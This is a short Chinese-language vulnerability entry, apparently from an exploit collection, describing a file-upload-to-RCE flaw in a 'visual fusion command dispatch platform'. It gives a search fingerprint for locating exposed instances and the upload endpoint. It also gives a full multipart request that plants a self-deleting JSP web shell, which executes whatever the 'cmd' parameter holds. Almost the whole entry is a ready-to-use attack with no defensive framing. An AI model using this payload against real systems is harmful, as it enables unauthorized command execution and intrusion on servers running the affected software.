# 可视化融合指挥调度平台upload存在文件上传致RCE漏洞

- **系统**：可视化融合指挥调度平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="base/searchInfoWindow_min.css"`
- **请求**：`POST /dm/dispatch/user/upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307…`

**请求体 / payload**
```
------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="file";filename="1.jsp"
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary7ctER307B0RaQwOp--
```
- **预期**：200　|　—